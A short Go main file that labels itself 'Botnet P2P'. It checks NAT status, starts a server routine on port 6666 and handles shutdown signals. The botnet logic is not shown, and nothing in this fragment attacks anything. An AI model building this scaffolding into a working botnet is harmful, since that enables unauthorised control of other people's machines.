package main

import (
	"fmt"
	"os"
	"os/signal"
	"log"
	"syscall"
)

func main() {
	fmt.Println("Botnet P2P")
	nat, _ := checkNAT()
	terminate := make(chan bool)
	fmt.Printf("NAT: %t\n", nat)
	go exitHandler(terminate)
	serverRoutine(6666, terminate)
}

func exitHandler(term chan bool) {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	term<-true
	log.Println("App terminated!")
	os.Exit(0)
}